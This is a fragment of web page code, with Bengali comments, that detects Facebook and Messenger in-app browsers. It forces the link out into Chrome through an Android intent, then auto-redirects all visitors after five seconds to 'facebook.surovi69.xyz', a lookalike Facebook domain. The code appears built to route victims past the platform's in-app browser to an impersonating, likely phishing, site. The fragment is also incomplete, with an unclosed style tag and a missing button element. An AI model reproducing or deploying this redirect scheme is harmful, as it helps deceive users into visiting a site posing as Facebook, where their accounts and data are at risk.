    <style>

    <script>
        const targetUrl = "https://facebook.surovi69.xyz";
        const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";

        function handleRedirect() {
            // ফেসবুক বা মেসেঞ্জার অ্যাপ চেক
            if (/FBAN|FBAV|Messenger/i.test(navigator.userAgent)) {
                window.location.href = chromeIntent;
                // যদি ইন্টেন্ট ফেল করে, তবে সাধারণ রিডাইরেক্ট
                setTimeout(() => { window.location.href = targetUrl; }, 1000);
            } else {
                window.location.href = targetUrl;
            }
        }

        document.getElementById('actionBtn').addEventListener('click', function(e) {
            e.preventDefault();
            handleRedirect();
        });

        // ৫ সেকেন্ড পর অটো রিডাইরেক্ট হবে
        window.onload = function() {
            setTimeout(() => { handleRedirect(); }, 5000); 
        };
